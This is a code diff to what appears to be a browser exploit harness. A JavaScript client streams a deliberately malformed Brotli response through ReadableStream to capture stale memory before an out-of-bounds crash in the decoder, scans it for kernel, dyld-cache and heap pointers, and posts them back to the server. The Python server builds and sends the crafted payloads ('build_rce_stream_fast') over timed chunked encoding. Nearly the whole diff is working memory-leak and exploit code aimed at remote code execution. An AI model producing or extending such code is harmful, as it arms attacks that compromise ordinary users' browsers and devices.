@@ -752,9 +752,117 @@ async function run() {
     }
     await new Promise(r => setTimeout(r, 300));
 
-    // Phase 3: Fire poison streams
-    log('\\n=== PHASE 3: Fire poison streams ===', 'info');
-    let endpoints = ['/poison/leak', '/poison/info', '/poison/spray', '/stale-read'];
+    // Phase 3: Streaming stale-data capture via ReadableStream
+    log('\\n=== PHASE 3: Streaming stale-data capture ===', 'info');
+    log('Using ReadableStream to capture decoded data before OOB crash...', 'info');
+    let staleChunks = [];
+    let staleTotal = 0;
+    try {
+        let r = await fetch(S + '/stale-stream');
+        let reader = r.body.getReader();
+        try {
+            while (true) {
+                let {done, value} = await reader.read();
+                if (done) break;
+                staleChunks.push(new Uint8Array(value));
+                staleTotal += value.byteLength;
+                log('[+] Stream chunk: ' + value.byteLength + 'B (total: ' + staleTotal + 'B)');
+            }
+            log('[+] Stream completed cleanly: ' + staleTotal + 'B', 'info');
+        } catch(e) {
+            log('[!] Stream error after ' + staleTotal + 'B: ' + e.name + ': ' + e.message,
+                staleTotal > 0 ? 'warn' : 'err');
+        }
+    } catch(e) {
+        log('[-] Fetch failed: ' + e.name + ': ' + e.message, 'err');
+    }
+
+    // Analyze captured stale data
+    if (staleTotal > 0) {
+        log('\\n--- Stale data analysis (' + staleTotal + ' bytes) ---', 'info');
+        // Merge chunks
+        let merged = new Uint8Array(staleTotal);
+        let off = 0;
+        for (let c of staleChunks) { merged.set(c, off); off += c.byteLength; }
+
+        // Skip prefix (first 8 bytes are null)
+        let dataStart = 8;
+        let nonZero = 0, uniqueBytes = new Set();
+        for (let j = dataStart; j < Math.min(merged.length, dataStart + 4096); j++) {
+            if (merged[j] !== 0) nonZero++;
+            uniqueBytes.add(merged[j]);
+        }
+        log('First 4KB after prefix: ' + nonZero + ' non-zero bytes, ' + uniqueBytes.size + ' unique values');
+
+        // Show hex dump at ring-buffer wrap boundaries (every 128KB)
+        let rbSize = 131072;
+        for (let wrap = 0; wrap < Math.min(staleTotal, rbSize * 4); wrap += rbSize) {
+            let hex = '';
+            for (let j = wrap; j < Math.min(wrap + 64, merged.length); j++)
+                hex += merged[j].toString(16).padStart(2, '0') + ' ';
+            log('  @' + wrap + ': ' + hex.slice(0, 192), 'info');
+        }
+
+        // Look for pointer-like values (8-byte aligned)
+        let ptrs = [];
+        let dv = new DataView(merged.buffer);
+        for (let j = dataStart; j + 8 <= merged.length; j += 8) {
+            let lo = dv.getUint32(j, true);
+            let hi = dv.getUint32(j + 4, true);
+            if (lo === 0 && hi === 0) continue;
+            let val = (hi * 0x100000000) + lo;
+            // kernel ptr: 0xFFFFFE...
+            if (hi >= 0xFFFFFE00 && hi <= 0xFFFFFF00) ptrs.push({off: j, hi, lo, kind: 'KERNEL'});
+            // dyld shared cache: 0x180000000-0x280000000
+            else if (hi >= 1 && hi <= 2 && lo >= 0x80000000)
+                ptrs.push({off: j, hi, lo, kind: 'dyld_cache'});
+            // heap ptr
+            else if (hi >= 1 && hi <= 1 && lo >= 0)
+                ptrs.push({off: j, hi, lo, kind: 'heap'});
+        }
+        if (ptrs.length > 0) {
+            log('\\n[!!!] POINTER-LIKE VALUES FOUND: ' + ptrs.length, 'err');
+            for (let p of ptrs.slice(0, 20)) {
+                let hex = '0x' + p.hi.toString(16).padStart(8,'0') + p.lo.toString(16).padStart(8,'0');
+                log('  +0x' + p.off.toString(16) + ': ' + hex + ' (' + p.kind + ')', 'err');
+            }
+            // Report to server
+            fetch(S + '/probe/readback', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    session: sid, slot: -1, source: 'stale-stream',
+                    total_bytes: staleTotal, pointer_count: ptrs.length,
+                    pointers: ptrs.slice(0, 50).map(p => ({
+                        offset: p.off,
+                        value: '0x' + p.hi.toString(16).padStart(8,'0') + p.lo.toString(16).padStart(8,'0'),
+                        kind: p.kind
+                    }))
+                })
+            });
+        } else {
+            log('No pointer-like values in first scan', 'warn');
+            // Check for groom marker bytes (0x40-0x5F from slots 0-31)
+            let markerHits = {};
+            for (let j = dataStart; j < merged.length; j++) {
+                let b = merged[j];
+                if (b >= 0x40 && b <= 0x5F) {
+                    markerHits[b] = (markerHits[b] || 0) + 1;
+                }
+            }
+            let markers = Object.keys(markerHits);
+            if (markers.length > 0) {
+                log('[!] Groom marker bytes detected:', 'warn');
+                for (let m of markers.sort()) {
+                    log('  0x' + parseInt(m).toString(16) + ': ' + markerHits[m] + ' occurrences');
+                }
+            }
+        }
+    }
+
+    // Also fire legacy poison streams for comparison
+    log('\\n--- Legacy poison streams (for comparison) ---', 'info');
+    let endpoints = ['/poison/leak', '/stale-read'];
     for (let ep of endpoints) {
         try {
             let r = await fetch(S + ep, {headers: {'Accept': 'application/octet-stream'}});
@@ -834,6 +942,35 @@ def _send_br_response(ssl_sock, payload):
         b"Cache-Control: no-store\r\n\r\n"
     )
     ssl_sock.sendall(headers + payload)
+
+
+def _send_br_chunked_stream(ssl_sock, payload, split_frac=0.85, delay=0.5):
+    """Send Brotli payload using chunked transfer encoding with a delay.
+
+    Splits the raw Brotli bytes at split_frac (e.g. 85%) and sends the
+    first part, waits delay seconds, then sends the rest.  The browser's
+    Brotli decoder processes bytes incrementally, flushing decoded output
+    on ring-buffer wraps.  ReadableStream on the client can capture those
+    flushes before the OOB trigger in the tail bytes crashes the decoder.
+    """
+    split = int(len(payload) * split_frac)
+    part_a = payload[:split]
+    part_b = payload[split:]
+
+    headers = (
+        b"HTTP/1.1 200 OK\r\n"
+        b"Content-Type: application/octet-stream\r\n"
+        b"Content-Encoding: br\r\n"
+        b"Transfer-Encoding: chunked\r\n"
+        b"Access-Control-Allow-Origin: *\r\n"
+        b"Connection: close\r\n"
+        b"Cache-Control: no-store\r\n\r\n"
+    )
+    ssl_sock.sendall(headers)
+    ssl_sock.sendall(chunk(part_a))
+    time.sleep(delay)
+    ssl_sock.sendall(chunk(part_b))
+    ssl_sock.sendall(chunk_end())
 
 
 def _send_html(ssl_sock, body_str):
@@ -1009,6 +1146,23 @@ def handle_client(ssl_sock, addr, stage1, stage2_crash):
             payload = build_rce_stream_fast(prefix, 0x003F0F)
             print(f"  -> STALE-READ: 8B null prefix, cbe=0x003F0F, total={len(payload)}B")
             _send_br_response(ssl_sock, payload)
+
+        # --- Streaming stale-data leak (ReadableStream capture) ---
+        elif path == "/stale-stream":
+            # Like /stale-read but sent via chunked transfer so the browser
+            # flushes decoded ring-buffer wraps through ReadableStream before
+            # the OOB trigger crashes the decoder.
+            # cbe=0x03F000 → block_length=274049, ~1.07MB of valid decoded
+            # output (8 ring-buffer wraps) before the OOB trigger fires.
+            # extra_commands=100 to minimize the OOB phase.
+            prefix = b"\x00" * 8
+            cbe = 0x03F000
+            bl = 16625 + cbe
+            payload = build_rce_stream_fast(prefix, cbe, extra=100)
+            print(f"  -> STALE-STREAM: {len(payload)}B, bl={bl}, "
+                  f"valid_out={bl*4}B ({bl*4//131072} wraps), chunked")
+            _send_br_chunked_stream(ssl_sock, payload, split_frac=0.85, delay=0.5)
+            return  # connection already closed by chunked helper
 
         # --- Optimized poison endpoints (small CBE for deterministic OOB) ---
         elif path.startswith("/poison/"):
